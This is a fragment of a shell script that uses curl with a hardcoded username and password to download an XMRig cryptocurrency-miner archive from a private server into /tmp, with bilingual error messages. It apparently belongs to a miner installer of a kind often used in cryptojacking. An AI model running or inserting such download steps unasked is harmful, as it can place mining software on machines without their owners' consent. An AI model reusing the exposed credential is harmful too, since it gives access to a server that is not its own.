...
if ! curl -L --progress-bar -u link:Asdfg123.6 "http://chuncheon-arm-x.oracle.limuwong.com:38888/xmrig.tar.gz" -o /tmp/xmrig.tar.gz; then
  echo "ERROR: Can't download http://chuncheon-arm-x.oracle.limuwong.com:38888/xmrig.tar.gz file to /tmp/xmrig.tar.gz"
  echo "发生错误: 无法下载 http://chuncheon-arm-x.oracle.limuwong.com:38888/xmrig.tar.gz 文件到 /tmp/xmrig.tar.gz"
  exit 1
fi
